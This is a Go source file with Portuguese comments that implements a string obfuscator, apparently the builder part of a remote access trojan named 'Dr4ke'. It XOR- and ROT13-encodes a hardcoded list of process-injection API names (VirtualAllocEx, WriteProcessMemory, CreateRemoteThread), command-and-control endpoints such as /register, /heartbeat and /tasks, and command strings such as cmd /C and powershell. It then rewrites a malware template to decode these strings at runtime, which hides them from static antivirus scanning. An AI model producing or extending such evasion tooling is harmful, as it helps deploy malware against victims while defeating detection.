package main

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

type ObfuscatedString struct {
	Original  string
	Encrypted string
	Method    string
	Key       string
	VarName   string
}

type RealisticObfuscator struct {
	stringMap map[string]ObfuscatedString
	varCount  int
}

func NewRealisticObfuscator() *RealisticObfuscator {
	rand.Seed(time.Now().UnixNano())
	return &RealisticObfuscator{
		stringMap: make(map[string]ObfuscatedString),
		varCount:  0,
	}
}

func (ro *RealisticObfuscator) getCriticalStrings() []string {
	return []string{
		"ntdll.dll",
		"kernel32.dll",
		"shell32.dll",
		"VirtualAlloc",
		"VirtualAllocEx",
		"WriteProcessMemory",
		"CreateRemoteThread",
		"LoadLibrary",
		"LoadLibraryW",
		"GetProcAddress",
		"OpenProcess",
		"CloseHandle",
		"GetModuleHandleW",
		"IsUserAnAdmin",

		"User-Agent",
		"Content-Type",
		"Authorization",
		"Connection",
		"X-Build-ID",
		"application/json",
		"Bearer ",
		"keep-alive",

		"Mozilla/5.0",
		"Dr4ke-Client",

		".exe",
		".dll",
		".bat",
		"temp",
		"uploads",
		"dr4ke",
		"dr4ke_uploads",
		"script_",

		"cmd", "/C",
		"/register",
		"/heartbeat",
		"/tasks",
		"/result",
		"wmic",
		"powershell",
		"tasklist",
		"process",
		"processid",

		"Failed to",
		"Error:",
		"Access Denied",
		"not found",

		"GET",
		"POST",
	}
}

func (ro *RealisticObfuscator) getStringPriority(str string) bool {
	highPriorityPatterns := []string{
		"dll", "api", "process", "inject", "alloc", "write", "thread",
		"User-Agent", "Authorization", "Bearer", "ntdll", "kernel32",
	}

	strLower := strings.ToLower(str)
	for _, pattern := range highPriorityPatterns {
		if strings.Contains(strLower, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

func (ro *RealisticObfuscator) chooseMethod(str string) string {
	isHighPriority := ro.getStringPriority(str)

	if isHighPriority {
		methods := []string{"xor", "xor", "xor", "xor", "xor", "split", "rot13"}
		return methods[rand.Intn(len(methods))]
	} else {
		methods := []string{"xor", "xor", "xor", "split", "split", "rot13"}
		return methods[rand.Intn(len(methods))]
	}
}

func (ro *RealisticObfuscator) generateVarName() string {
	varName := fmt.Sprintf("s%d", ro.varCount)
	ro.varCount++
	return varName
}

func (ro *RealisticObfuscator) AddString(original string) {
	if _, exists := ro.stringMap[original]; exists {
		return
	}

	method := ro.chooseMethod(original)
	varName := ro.generateVarName()

	var encrypted, key string

	switch method {
	case "xor":
		encrypted, key = ro.xorEncrypt(original)
	case "split":
		encrypted = ""
		key = ""
	case "rot13":
		encrypted = ro.rot13Encrypt(original)
		key = ""
	}

	ro.stringMap[original] = ObfuscatedString{
		Original:  original,
		Encrypted: encrypted,
		Method:    method,
		Key:       key,
		VarName:   varName,
	}
}

func (ro *RealisticObfuscator) GetObfuscatedStrings() map[string]ObfuscatedString {
	return ro.stringMap
}

func (ro *RealisticObfuscator) GetStringCount() int {
	return len(ro.stringMap)
}

func (ro *RealisticObfuscator) ProcessAllCriticalStrings() {
	criticalStrings := ro.getCriticalStrings()

	for _, str := range criticalStrings {
		ro.AddString(str)
	}
}

func (ro *RealisticObfuscator) GetStats() map[string]int {
	stats := map[string]int{
		"xor":   0,
		"split": 0,
		"rot13": 0,
		"total": len(ro.stringMap),
	}

	for _, obf := range ro.stringMap {
		stats[obf.Method]++
	}

	return stats
}

func (ro *RealisticObfuscator) xorEncrypt(input string) (string, string) {
	keySize := rand.Intn(9) + 4
	key := make([]byte, keySize)

	for i := range key {
		key[i] = byte(rand.Intn(256))
	}

	data := []byte(input)
	result := make([]byte, len(data))

	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}

	return fmt.Sprintf("%x", result), fmt.Sprintf("%x", key)
}

func (ro *RealisticObfuscator) rot13Encrypt(input string) string {
	result := make([]byte, len(input))
	for i, c := range []byte(input) {
		if c >= 'A' && c <= 'Z' {
			result[i] = 'A' + (c-'A'+13)%26
		} else if c >= 'a' && c <= 'z' {
			result[i] = 'a' + (c-'a'+13)%26
		} else {
			result[i] = c
		}
	}

	return fmt.Sprintf("%x", result)
}

func (ro *RealisticObfuscator) splitString(input string) []string {
	if len(input) < 4 {
		return []string{input}
	}

	parts := rand.Intn(3) + 2
	partSize := len(input) / parts

	var result []string
	for i := 0; i < parts; i++ {
		start := i * partSize
		end := start + partSize
		if i == parts-1 {
			end = len(input)
		}
		result = append(result, input[start:end])
	}

	return result
}

func (ro *RealisticObfuscator) generateDecryptFunctions() string {
	return `
// Funções de decrypt para strings obfuscadas
func decXOR(hexData, hexKey string) string {
	data := hexToBytes(hexData)
	key := hexToBytes(hexKey)
	result := make([]byte, len(data))
	
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	
	return string(result)
}

func decROT13(hexData string) string {
	data := hexToBytes(hexData)
	result := make([]byte, len(data))
	
	for i, c := range data {
		if c >= 'A' && c <= 'Z' {
			result[i] = 'A' + (c-'A'+13)%26
		} else if c >= 'a' && c <= 'z' {
			result[i] = 'a' + (c-'a'+13)%26
		} else {
			result[i] = c
		}
	}
	
	return string(result)
}

func hexToBytes(hex string) []byte {
	result := make([]byte, len(hex)/2)
	for i := 0; i < len(hex); i += 2 {
		var b byte
		fmt.Sscanf(hex[i:i+2], "%02x", &b)
		result[i/2] = b
	}
	return result
}
`
}

func (ro *RealisticObfuscator) generateObfuscatedVariables() string {
	code := "\n// Variáveis com strings obfuscadas\nvar (\n"

	for _, obf := range ro.stringMap {
		switch obf.Method {
		case "xor":
			code += fmt.Sprintf("\t%s = decXOR(\"%s\", \"%s\")\n",
				obf.VarName, obf.Encrypted, obf.Key)
		case "split":
			parts := ro.splitString(obf.Original)
			code += fmt.Sprintf("\t%s = \"%s\"\n",
				obf.VarName, strings.Join(parts, "\" + \""))
		case "rot13":
			code += fmt.Sprintf("\t%s = decROT13(\"%s\")\n",
				obf.VarName, obf.Encrypted)
		}
	}

	code += ")\n"
	return code
}

func (ro *RealisticObfuscator) generateStubCode() string {
	code := ro.generateDecryptFunctions()
	code += ro.generateObfuscatedVariables()
	return code
}

func (ro *RealisticObfuscator) getReplacementMap() map[string]string {
	replacements := make(map[string]string)

	for original, obf := range ro.stringMap {
		replacements[original] = obf.VarName
	}

	return replacements
}

func (ro *RealisticObfuscator) processTemplate(templateContent string) string {
	replacements := ro.getReplacementMap()

	for original, varName := range replacements {

		templateContent = strings.ReplaceAll(templateContent,
			fmt.Sprintf("\"%s\"", original), varName)

		templateContent = strings.ReplaceAll(templateContent,
			fmt.Sprintf("'%s'", original), varName)
	}

	return templateContent
}

func (ro *RealisticObfuscator) validateObfuscation() []string {
	var issues []string

	if len(ro.stringMap) == 0 {
		issues = append(issues, "Nenhuma string foi obfuscada")
	}

	stats := ro.GetStats()
	if stats["total"] < 10 {
		issues = append(issues, "Poucas strings obfuscadas (mínimo recomendado: 10)")
	}

	if stats["xor"] == 0 {
		issues = append(issues, "Método XOR não está sendo usado")
	}

	return issues
}

func (ro *RealisticObfuscator) ObfuscateAllCriticalStrings() error {
	criticalStrings := ro.getCriticalStrings()

	for _, str := range criticalStrings {
		ro.AddString(str)
	}

	if issues := ro.validateObfuscation(); len(issues) > 0 {
		return fmt.Errorf("problemas na obfuscação: %v", issues)
	}

	return nil
}
